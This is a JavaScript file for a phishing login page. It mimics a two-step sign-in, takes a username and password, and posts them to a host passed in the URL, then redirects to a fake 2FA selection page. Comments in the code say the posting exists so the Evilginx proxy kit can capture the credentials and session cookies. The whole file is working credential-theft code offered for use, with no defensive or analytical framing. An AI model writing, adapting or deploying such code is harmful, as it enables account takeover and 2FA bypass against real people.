document.addEventListener("DOMContentLoaded", () => {
  const params = new URLSearchParams(window.location.search)
  const apiHost = params.get("api_host")

  const errorBanner = document.getElementById("error-banner")
  const emailStep = document.getElementById("email-step")
  const passwordStep = document.getElementById("password-step")
  const nextToPasswordBtn = document.getElementById("next-to-password")
  const loginForm = document.getElementById("login-form")
  const usernameInput = document.getElementById("username")
  const passwordInput = document.getElementById("password")
  const userIdentifier = document.getElementById("user-identifier")

  if (!apiHost) {
    document.body.innerHTML = "<h1>Configuration Error: api_host parameter is missing.</h1>"
    return
  }

  function showError(message) {
    errorBanner.textContent = message
    errorBanner.style.display = "block"
  }

  nextToPasswordBtn.addEventListener("click", (e) => {
    e.preventDefault()
    if (usernameInput.value.trim() === "") {
      showError("Please enter a username or email.")
      return
    }
    errorBanner.style.display = "none"
    userIdentifier.textContent = `Signing in as ${usernameInput.value}`
    emailStep.classList.remove("active")
    passwordStep.classList.add("active")
  })

  loginForm.addEventListener("submit", (e) => {
    e.preventDefault()
    const username = usernameInput.value
    const password = passwordInput.value

    if (password.trim() === "") {
      showError("Please enter your password.")
      return
    }

    const submitButton = document.getElementById("submit-credentials")
    submitButton.textContent = "Please wait..."
    submitButton.disabled = true

    const formData = new URLSearchParams()
    formData.append("username", username)
    formData.append("passwd", password)

    fetch(`${apiHost}/account/challenge/password`, {
      method: "POST",
      body: formData,
      credentials: "omit", // We are not in a proxied context, so we can't include credentials directly
    })
      .then((response) => {
        // We don't need to parse the response. The act of posting the credentials
        // to the proxied endpoint is what allows Evilginx to capture them and the cookies.
        // We assume the next step is always 2FA for a robust flow.
        sessionStorage.setItem("yh_username", username)
        sessionStorage.setItem("yh_api_host", apiHost)
        window.location.href = "2fa-selection.html"
      })
      .catch((error) => {
        console.error("Error submitting credentials:", error)
        showError("An unexpected error occurred. Please try again.")
        submitButton.textContent = "Next"
        submitButton.disabled = false
      })
  })
})
